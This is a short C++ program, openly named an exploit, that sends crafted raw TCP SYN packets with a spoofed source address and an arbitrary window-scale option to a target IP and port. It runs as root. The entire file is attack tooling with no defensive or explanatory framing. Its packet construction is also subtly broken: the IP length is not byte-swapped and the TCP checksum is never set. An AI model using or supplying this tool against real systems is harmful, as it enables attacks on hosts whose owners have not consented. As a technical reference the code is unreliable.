// Compile: g++ -o window_scale window_scale.cpp
// Run: sudo ./window_scale <target_ip> <target_port> <scale>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class WindowScaleExploit {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    WindowScaleExploit() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    void exploit(const char* targetIP, int targetPort, int scale) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(targetPort);
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        char* options = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
        
        memset(packet, 0, 4096);
        
        // Window scale option (Kind=3, Length=3)
        options[0] = 0x01;  // NOP
        options[1] = 0x01;  // NOP
        options[2] = 0x03;  // Window scale kind
        options[3] = 0x03;  // Length
        options[4] = scale;  // Scale factor
        
        int optLen = 5;
        // Pad to 4-byte boundary
        int paddedOptLen = (optLen + 3) & ~3;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + paddedOptLen;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr("192.168.1.100");
        ip->daddr = target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        tcp->source = htons(rand() % 65535);
        tcp->dest = target.sin_port;
        tcp->seq = rand();
        tcp->doff = 5 + (paddedOptLen / 4);
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        sendto(sock, packet, ip->tot_len, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~WindowScaleExploit() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <scale>\n";
        return 1;
    }
    WindowScaleExploit exploit;
    exploit.exploit(argv[1], atoi(argv[2]), atoi(argv[3]));
    return 0;
}